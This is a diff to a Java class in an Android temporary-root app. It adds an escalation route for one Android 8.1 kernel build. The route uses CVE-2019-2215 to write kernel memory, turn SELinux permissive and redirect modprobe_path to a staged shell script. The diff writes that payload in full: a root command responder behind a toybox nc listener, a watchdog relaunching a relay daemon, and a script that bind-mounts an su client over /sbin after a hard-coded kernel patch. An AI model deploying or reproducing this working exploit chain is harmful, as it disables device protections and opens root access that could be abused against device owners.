@@ -47,12 +47,28 @@ public final class Chain {
         try {
             log.line("state before: " + Esc.nativeState());
 
-            String probe = Esc.nativeProbe();
-            log.line("selftest (diagnostic only): " + probe);
+            /* Route first: the 6.0.1 positive control exercises THAT kernel's constants, so it
+             * must not run on the 8.1 primitive (wrong offsets, wrong chunk sizes). */
+            String krel = kernelReleaseFor(ctx, log);
+            /* Route 8's two writes carry absolute addresses from PD1610_D_8.19.16, whose release
+             * is exactly 3.18.71-perf-g8a8c60dd.  Any other 3.18.71 patch must be refused, not
+             * handed to route 6 (6.0.1 addresses into an 8.x kernel is a reboot, not a retry). */
+            boolean is8 = krel.startsWith("3.18.71-perf-g8a8c60dd");
+            boolean is8family = krel.startsWith("3.18.71");
+            route8 = is8;
+            if (is8family) {
+                log.line("selftest skipped on 3.18.71 (the probe belongs to the 6.0.1 primitive)");
+            } else {
+                String probe = Esc.nativeProbe();
+                log.line("selftest (diagnostic only): " + probe);
+            }
 
-            File sud = stage(ctx, log, "sud");
+            /* Route 8's helper is a SCRIPT, not sud: in u:r:kernel:s0 a static libc ELF reports
+             * success and does nothing (measured 2026-10-23), while #! scripts and /system/bin
+             * binaries run.  The script starts a same-protocol responder on 12346. */
+            File sud = is8 ? stagePayload8(ctx, log) : stage(ctx, log, "sud");
             if (sud == null) {
-                log.line("ABORT: daemon not staged");
+                log.line("ABORT: " + (is8 ? "payload" : "daemon") + " not staged");
                 return;
             }
             selfGrant(ctx, log);
@@ -66,8 +82,20 @@ public final class Chain {
              * attempt is idempotent -- esc_escalate skips writes that already landed
              * and only re-fires the trigger -- so retrying is cheap and safe. */
             boolean rooted;
-            String krel = kernelReleaseFor(ctx, log);
-            if (krel.startsWith("3.18.31")) {
+            if (is8) {
+                /* 8.1: CVE-2019-2215 -> arbitrary kernel write -> permissive + modprobe_path ->
+                 * the kernel runs our script.  The script must be staged by us and readable, and
+                 * it must be a #! file (see stagePayload8). */
+                log.line("kernel " + krel + " -> route 8 (CVE-2019-2215 kernel write, shell payload)");
+                rooted = tryEscalate8(sud.getAbsolutePath(), rounds, log);
+            } else if (is8family) {
+                /* A 3.18.71 patch whose build tag is not the one route 8's addresses were read
+                 * from.  Falling through to route 6 would write 6.0.1 addresses into an 8.x
+                 * kernel, so refuse loudly instead. */
+                log.line("kernel '" + krel + "' is 3.18.71 but not 3.18.71-perf-g8a8c60dd -- route 8's "
+                        + "addresses are that build's only; REFUSING to write, nothing was attempted");
+                rooted = false;
+            } else if (krel.startsWith("3.18.31")) {
                 /* 7.1.1 ships a different mechanism: the usermodehelper path this app uses on 6.0.1 is
                  * blocked there, so a staged helper escalates itself in-process and starts the daemon.
                  * art/ledger-20261016.md 512-528 is the measurement trail. */
@@ -91,8 +119,8 @@ public final class Chain {
                  * build, so a write here aims at addresses nothing owns -- refuse and say so rather than
                  * guess.  This is the branch a corrupted `os.version` lands in, and corrupting it is
                  * something WE do (see kernelReleaseFor). */
-                log.line("kernel '" + krel + "' is neither 7 (3.18.31*) nor a known 3.18.x -- "
-                        + "REFUSING to write, nothing was attempted");
+                log.line("kernel '" + krel + "' is neither 8 (3.18.71*), 7 (3.18.31*) nor a known "
+                        + "3.18.x -- REFUSING to write, nothing was attempted");
                 rooted = false;
             }
             log.line("state after: " + Esc.nativeState());
@@ -102,7 +130,9 @@ public final class Chain {
                 BootJob.markEscalated(ctx);
             if (rooted && krel.startsWith("3.18.31"))
                 applyGainChoice(ctx, log);
-            if (rooted && krel.startsWith("3.18.31"))
+            if (rooted && is8)
+                openSuName8(ctx, log);
+            else if (rooted && krel.startsWith("3.18.31"))
                 openSuName7(ctx, log);
             else if (rooted)
                 openSuName(ctx, log, rounds);
@@ -110,6 +140,9 @@ public final class Chain {
                 startRelay(ctx, log);
             if (rooted && mapPlanted)
                 restoreEnforcing(log);
+            else if (rooted && is8)
+                log.line("route 8 needs the GLOBAL permissive flip (selinux_enforcing=0); this build "
+                        + "has no permissive_map exemption, so enforcing stays off until reboot");
             else if (rooted)
                 log.line(krel.startsWith("3.18.31")
                         ? "route 7 owns its own enforcing flip (broot7 does it after the daemon is up); "
@@ -164,7 +197,7 @@ public final class Chain {
     private static String kernelReleaseFor(Context ctx, Log log) {
         String now = kernelRelease();
         android.content.SharedPreferences p = ctx.getSharedPreferences("temproot", 0);
-        if (now.startsWith("3.18.31") || now.startsWith("3.18.20")) {
+        if (now.startsWith("3.18.31") || now.startsWith("3.18.71") || now.startsWith("3.18.20")) {
             p.edit().putString("krel", now).apply();
             return now;
         }
@@ -311,6 +344,194 @@ public final class Chain {
             }
         }
         return false;
+    }
+
+    /** Route 8: two kernel writes, then one trigger.  `rounds` is the number of primitive shots
+     *  per write (esc_escalate8 clamps it to 1..4); the caller's probe decides success. */
+    private static boolean tryEscalate8(String payload, int rounds, Log log) {
+        int tries = rounds < 1 ? 2 : (rounds > 4 ? 4 : rounds);
+        for (int attempt = 1; attempt <= 2; attempt++) {
+            String r = Esc.nativeEscalate8(payload, tries);
+            log.line("escalate8 attempt " + attempt + ": " + r);
+            String who = root("id; getenforce; grep -m1 CapEff /proc/self/status");
+            log.line("  root probe [" + lastChannel + "]: " + who);
+            if (who.startsWith("uid=0"))
+                return true;
+            try {
+                Thread.sleep(2500);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return false;
+            }
+        }
+        return false;
+    }
+
+    /** Route 8 stages TWO #! scripts.  `sud8` is what modprobe_path points at (the kernel helper
+     *  execs it in u:r:kernel:s0); `sud8srv` is what toybox nc runs per connection.  Both are
+     *  scripts because that domain silently discards everything a static libc ELF does -- and the
+     *  responder must be a script anyway, since it has to stay alive after `sud8` exits and be
+     *  restarted only by a fresh trigger.  Paths are absolute: the helper gets no useful env. */
+    private static File stagePayload8(Context ctx, Log log) {
+        final String B = "/data/data/com.xplay6.temproot/files";
+        File srv = new File(ctx.getFilesDir(), "sud8srv");
+        File pay = new File(ctx.getFilesDir(), "sud8");
+
+        String responder =
+                "#!/system/bin/sh\n"
+              + "PATH=/system/bin:/system/xbin:/sbin\n"
+              /* libshizuku starter 会 exec app_process；缺 ANDROID_DATA 时 libjavacore 直接
+               * SIGABRT（"ANDROID_DATA environment variable not set"）。 */
+              + "export ANDROID_ROOT=/system ANDROID_ASSETS=/system/app ANDROID_DATA=/data "
+              + "ANDROID_STORAGE=/storage\n"
+              + "export EXTERNAL_STORAGE=/sdcard ASEC_MOUNTPOINT=/mnt/asec DOWNLOAD_CACHE=/data/cache\n"
+              + "B=" + B + "\n"
+              + "LOG=/data/local/tmp/.sud/sud.log\n"
+              + "IFS= read -r line || exit 0\n"
+              + "line=$(printf '%s' \"$line\" | /system/bin/toybox tr -d '\\r')\n"
+              + "case \"$line\" in\n"
+              + "  *\" TOK=\"*) tok=${line##* TOK=} ;;\n"
+              + "  *) echo 'REFUSED no token'; exit 0 ;;\n"
+              + "esac\n"
+              + "line=${line% TOK=*}\n"
+              + "want=$(/system/bin/toybox head -c 96 \"$B/su.token\" 2>/dev/null "
+              + "| /system/bin/toybox tr -d '\\r\\n ')\n"
+              + "[ -n \"$tok\" ] && [ \"$tok\" = \"$want\" ] || { echo 'REFUSED token'; exit 0; }\n"
+              + "case \"$line\" in\n"
+              + "  SU\\ *) rest=${line#SU } ;;\n"
+              + "  *) echo 'REFUSED unsupported'; exit 0 ;;\n"
+              + "esac\n"
+              + "uid=${rest%% *}\n"
+              + "if [ \"$uid\" = \"$rest\" ]; then cmd=; else cmd=${rest#* }; fi\n"
+              + "[ \"$uid\" = 0 ] || { echo 'REFUSED uid'; exit 0; }\n"
+              + "mkdir -p /data/local/tmp/.sud 2>/dev/null\n"
+              + "printf '%s SU 0 %s\\n' \"$(/system/bin/toybox date +%H:%M:%S)\" \"$cmd\" "
+              + ">> \"$LOG\" 2>/dev/null\n"
+              /* Same rule as sud's decision record: root-only, so no app can read which
+               * commands other apps ran.  suLog() reaches it through the token channel. */
+              + "chmod 0600 \"$LOG\" 2>/dev/null\n"
+              /* Shizuku 走交互式 root shell（`SU 0 -`，命令全在 stdin），所以整个交互
+               * shell 必须直接落在 u:r:shell:s0：uid 仍 0，但 /data ELF 可执行、
+               * binder/系统服务可用（kernel 域 service find 被 servicemanager 拒绝）。 */
+              + "if [ \"$cmd\" = \"-\" ]; then exec runcon u:r:shell:s0 /system/bin/sh; fi\n"
+              /* 非交互 `SU 0 <cmd>` 同理：kernel 域下 pm/am/appops 一律
+               * "Could not access the Package Manager"（servicemanager 的用户态 MAC 检查
+               * 不受全局 permissive 影响），shell 域 + permissive 才是完整的 root。 */
+              + "runcon u:r:shell:s0 /system/bin/sh -c \"$cmd\"\n"
+              + "rc=$?\n"
+              + "printf '\\n@SUD_EXIT=%d\\n' \"$rc\"\n";
+
+        String payload =
+                "#!/system/bin/sh\n"
+              + "PATH=/system/bin:/system/xbin:/sbin\n"
+              + "B=" + B + "\n"
+              + "mkdir -p /data/local/tmp/.sud 2>/dev/null\n"
+              + "chmod 0711 /data/local/tmp/.sud 2>/dev/null\n"
+              + "setsid /system/bin/toybox nc -L -p " + SU_PORT
+              + " /system/bin/sh \"$B/sud8srv\" >/dev/null 2>&1 &\n"
+              /* relayd 由 root 侧看门狗拉起、setsid 后 ppid=1，与 nc handler 同寿命：vivo RMS
+               * 杀掉 app 进程（后台服务，cached 随手杀）不再殃及 su 通道。app 活着时它自己的
+               * startRelay 先占住 @sud（untrusted_app 域），看门狗 pidof 检测到就不重复拉；
+               * app 一死 relayd 随死，看门狗 10s 内补位。relayd 必须 bind abstract @sud，
+               * kernel 域绑不了 AF_UNIX，所以 runcon 到 u:r:shell:s0（uid 仍 0，可读 0600 的
+               * grants/token，可 exec /data ELF）。--serve-if-free 兜底 stand down。 */
+              + "( while true; do\n"
+              + "  if ! pidof relayd >/dev/null 2>&1; then\n"
+              + "    runcon u:r:shell:s0 /system/bin/toybox setsid \"$B/relayd\""
+              + " --serve-if-free --sock sud --grants \"$B/grants.txt\""
+              + " --token \"$B/su.token\" --log /data/local/tmp/.sud/relayd.log >/dev/null 2>&1\n"
+              + "  fi\n"
+              + "  sleep 10\n"
+              + "done ) >/dev/null 2>&1 &\n"
+              + "exit 0\n";
+
+        if (!writeScript(log, srv, responder) || !writeScript(log, pay, payload))
+            return null;
+        log.line("route 8 payload ready: " + pay.getAbsolutePath()
+                + " (modprobe_path target; responder " + srv.getAbsolutePath() + ")");
+        return pay;
+    }
+
+    /** Write a staged script the way stage() writes a binary: unique temp name, then rename,
+     *  so a responder still running from the old inode is never truncated in place. */
+    private static boolean writeScript(Log log, File f, String body) {
+        File tmp = new File(f.getParentFile(), f.getName() + ".new." + System.currentTimeMillis());
+        try {
+            OutputStream o = new FileOutputStream(tmp);
+            o.write(body.getBytes("UTF-8"));
+            o.close();
+            tmp.setExecutable(true, false);
+            tmp.setReadable(true, false);
+            File real = f;
+            if (!tmp.renameTo(f)) {
+                log.line("rename " + tmp.getName() + " -> " + f.getName() + " failed, using temp path");
+                real = tmp;
+            }
+            real.setExecutable(true, false);
+            real.setReadable(true, false);
+            log.line("staged " + real.getAbsolutePath() + " bytes=" + real.length()
+                    + " canExec=" + real.canExecute());
+            return true;
+        } catch (Throwable t) {
+            log.line("write " + f.getName() + " failed: " + t);
+            return false;
+        }
+    }
+
+    /** Put a client on PATH the way sud's MOUNT does, but from a shell, because route 8 has no
+     *  daemon that can do it: /sbin is read-only rootfs, so every entry is bind-mounted into a
+     *  mirror under /data, the client is added under both names, and the mirror is bound over
+     *  /sbin.  The kernel helper runs in PID 1's mount namespace, which is the one apps see
+     *  (route 7 needed setns only because its daemon was the isolated one).
+     *  Name gate: esc8's step 2 patches the 8.1 checker (0xffffffc0001cb3cc -> `mov w0,#0;
+     *  ret`), so the literal name `su` and `sux` are both delivered here and both work --
+     *  measured as uid 2000: a real file named `su` returns 42 after the patch.  On a boot
+     *  where some su exec already happened before the patch the I-cache keeps the old code,
+     *  so `sux` remains a fallback.  Nothing is written to a partition. */
+    private static void openSuName8(Context ctx, Log log) {
+        File su = stage(ctx, log, "su");
+        if (su == null) {
+            log.line("  sux on PATH skipped: client not staged");
+            return;
+        }
+        File m = new File(ctx.getFilesDir(), "mirror8.sh");
+        String script =
+                "#!/system/bin/sh\n"
+              + "PATH=/system/bin:/system/xbin:/sbin\n"
+              + "T=/system/bin/toybox\n"
+              + "R=/data/local/tmp/.sur8\n"
+              /* A second chain run in the same boot must not build a mirror from the mirror: the
+               * marker is only reachable through OUR bind, so its presence means /sbin already is
+               * this mirror. */
+              + "[ -f /sbin/.r8mirror ] && { echo 'MIRROR8 already active'; exit 0; }\n"
+              + "rm -rf \"$R\"; mkdir -p \"$R\" || exit 1\n"
+              + "for f in /sbin/*; do\n"
+              + "  [ -e \"$f\" ] || continue\n"
+              + "  n=${f##*/}\n"
+              /* Never inherit a `su`/`sux` from whatever currently sits on /sbin: those names are
+               * exactly what we deliver, and an older placeholder would shadow our client. */
+              + "  case \"$n\" in su|sux) continue;; esac\n"
+              + "  if [ -d \"$f\" ]; then\n"
+              + "    mkdir -p \"$R/$n\"; $T mount --bind \"$f\" \"$R/$n\" 2>/dev/null; continue\n"
+              + "  fi\n"
+              + "  : > \"$R/$n\" || continue\n"
+              + "  $T mount --bind \"$f\" \"$R/$n\" 2>/dev/null "
+              + "|| { rm -f \"$R/$n\"; cp -p \"$f\" \"$R/$n\" 2>/dev/null; }\n"
+              + "done\n"
+              + ": > \"$R/.r8mirror\"\n"
+              + "cp \"" + su.getAbsolutePath() + "\" \"$R/su\" || exit 1\n"
+              + "cp \"" + su.getAbsolutePath() + "\" \"$R/sux\" || exit 1\n"
+              + "chmod 0755 \"$R/su\" \"$R/sux\"\n"
+              + "$T mount --bind \"$R\" /sbin || exit 1\n"
+              + "echo MIRROR8 ok\n"
+              + "ls -l /sbin/su /sbin/sux 2>&1\n";
+        if (!writeScript(log, m, script))
+            return;
+        log.line("  mirror /sbin: " + trim1(root("sh " + m.getAbsolutePath())));
+        log.line("  PATH witness: " + trim1(root(
+                "sh -c 'command -v sux; command -v su; ls -l /sbin/sux 2>&1 | tail -1'")));
+        log.line("  note: esc8 patched the name gate, so granted apps can call `su` (sux kept "
+                + "as fallback for boots where `su` ran before the patch)");
     }
 
     /** Does vivo's exec guard on the *name* `su` also bite an app-domain caller?
@@ -907,6 +1128,14 @@ public final class Chain {
     public static String su(int toUid, String cmd) {
         String r = null;
 
+        if (route8) {
+            /* Route 8's responder is a shell script behind toybox nc: it can serve the line
+             * protocol on 12346 but cannot call back over SCM_CREDENTIALS, so the token over
+             * loopback is the only channel.  Going straight there also skips the peer's 10 s
+             * timeout on every request. */
+            lastChannel = "tcp+token (route8)";
+            return ask("SU " + toUid + " " + cmd, 8000);
+        }
         try {
             r = Esc.nativePeerSu(toUid, cmd);
         } catch (Throwable t) {
@@ -1028,9 +1257,21 @@ public final class Chain {
     /** Set by a map-only attempt whose step1 witness read rc=0: our types are then exempt
      *  for the rest of this boot, whatever later step lost the race. */
     private static boolean mapPlanted = false;
+    /** True while this process serves an Android 8.1 boot.  Route 8's responder has no
+     *  SCM_CREDENTIALS reverse channel (it is a shell script), so requests go straight to
+     *  TCP+token instead of spending 10 s in the peer attempt first. */
+    private static boolean route8 = false;
 
     public static void useToken(Context ctx) {
         currentToken = token(ctx);
+        /* A new process (boot job, service restart) has not run the chain yet, so recover the
+         * route from the same remembered release the chain routes on. */
+        try {
+            String k = ctx.getSharedPreferences("temproot", 0).getString("krel", "");
+            route8 = k != null && k.startsWith("3.18.71-perf-g8a8c60dd");
+        } catch (Throwable ignore) {
+            /* keep whatever run() set */
+        }
     }
 
     /** The raw shell port -- what tools/verify_root.sh measures.  Kept so the same
@@ -1121,6 +1362,15 @@ public final class Chain {
      *  taken is named in the returned text, because "log unreadable" used to be reported as if it
      *  were the daemon's fault rather than the caller's permission. */
     public static String suLog() {
+        /* Route 8: the responder writes the same file but there is no `su` on PATH to run a
+         * fallback with (this ROM's name gate refuses it), so ask over the token channel. */
+        if (route8 || (lastChannel != null && lastChannel.indexOf("route8") >= 0)) {
+            if (currentToken != null && currentToken.length() > 0) {
+                String via = ask("tail -c 4096 /data/local/tmp/.sud/sud.log", 4000);
+                return via == null || via.trim().isEmpty()
+                        ? "(no requests yet)" : "via route8 channel: " + trim1(via);
+            }
+        }
         File f = new File("/data/local/tmp/.sud/sud.log");
         String direct;
         try {
